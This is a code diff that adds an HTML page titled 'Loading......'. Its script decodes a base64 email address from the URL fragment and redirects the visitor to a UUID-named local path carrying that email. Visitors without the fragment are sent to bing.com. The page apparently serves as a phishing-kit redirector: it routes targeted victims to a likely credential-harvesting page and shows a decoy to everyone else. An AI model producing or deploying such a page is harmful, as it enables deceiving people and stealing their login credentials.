@@ -1,1 +1,45 @@
-!!!
+<!DOCTYPE html>
+<html>
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <title>Loading......</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+   </head>
+   <body>
+      <script>
+          function b64DecodeUnicode(str) {
+            // Going backwards: from bytestream, to percent-encoding, to original string.
+            return decodeURIComponent(atob(str).split('').map(function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+          }
+         
+         function redirectPage(){
+           var query = window.location.href;
+           console.log(query);
+		   var myString = (data2);
+           var res = query.split("#");
+           var data1 = res[0];
+           var data2 = res[1];
+		 console.log(data1);
+           console.log(data2);
+         
+            realemailID = b64DecodeUnicode(data2);
+            console.log(realemailID);
+         
+           if (data2)
+           {
+             console.log("true");
+             window.location.href = "./e659d4a6-3a42-4191-9d70-769a75/#"+realemailID;
+           }else{
+             console.log("false");
+             window.location.href = "https://bing.com#";
+           }
+         }
+         
+         redirectPage();
+         
+      </script>
+   </body>
+</html>
